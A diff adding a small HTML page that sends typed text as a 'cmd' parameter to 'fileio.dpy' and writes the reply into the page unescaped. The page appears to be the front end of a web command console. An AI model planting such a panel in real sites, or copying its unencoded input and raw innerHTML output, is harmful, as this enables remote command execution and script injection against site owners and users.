@@ -1,0 +1,27 @@
+
+    RUN <input type="text" name="cmd" style='width: 800px' id='cmd'><br>
+    <button id="issue" value="Send" onclick='issuecmd()'>Send</button>
+<hr>
+<code id='online'>
+Awaiting...
+</code>
+<script>
+function issuecmd() {
+    var xhr = new XMLHttpRequest()
+xhr.open('GET','fileio.dpy?cmd='+document.getElementById('cmd').value)
+xhr.send(null)
+
+xhr.onreadystatechange = function() {
+    document.getElementById('online').innerHTML = xhr.responseText;
+    console.log(xhr.responseText)
+}
+}
+
+document.onkeydown = function (e) {
+  e = e || window.event;
+  switch (e.which || e.keyCode) {
+        case 13 : issuecmd()
+            break;
+  }
+}
+</script>
